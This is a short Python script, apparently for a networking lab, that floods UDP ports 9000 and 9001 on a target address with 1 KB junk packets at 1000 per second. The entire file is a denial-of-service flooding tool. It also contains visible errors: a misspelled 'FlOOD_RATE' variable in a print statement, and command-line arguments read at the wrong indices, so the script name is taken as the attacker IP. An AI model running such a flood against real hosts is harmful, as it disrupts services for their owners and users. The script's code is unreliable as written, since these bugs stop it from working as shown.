import os
import socket
import struct
import sys
import time

from shared import *

# Flood both ports used by 3.1 and 3.2
TARGET_PORTS = [9000, 9001]

# 1 KB of junk payload — large enough to consume real bandwidth
JUNK_PAYLOAD = os.urandom(1024)
FLOOD_RATE = 1000

def run_attacker(attacker_ip, target_ip, label="attacker"):
    sock = setup_socket(attacker_ip, 0)

    interval   = 1.0 / FLOOD_RATE
    deadline   = time.time() + DURATION
    sent       = 0
    port_cycle = 0

    print(f"[{label}] Flooding {target_ip} at {FlOOD_RATE} pps for {DURATION}s")

    while time.time() < deadline:
        port = TARGET_PORTS[port_cycle % len(TARGET_PORTS)]
        try:
            sock.sendto(JUNK_PAYLOAD, (target_ip, port))
            sent += 1
        except OSError:
            pass
        port_cycle += 1
        time.sleep(interval)

    sock.close()
    print(f"[{label}] Done. Sent {sent} flood packets ({sent * len(JUNK_PAYLOAD) // 1024} KB)")


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python3 attacker.py ATTACKER_IP TARGET_IP")
        sys.exit(1)

    run_attacker(sys.argv[0], sys.argv[1])
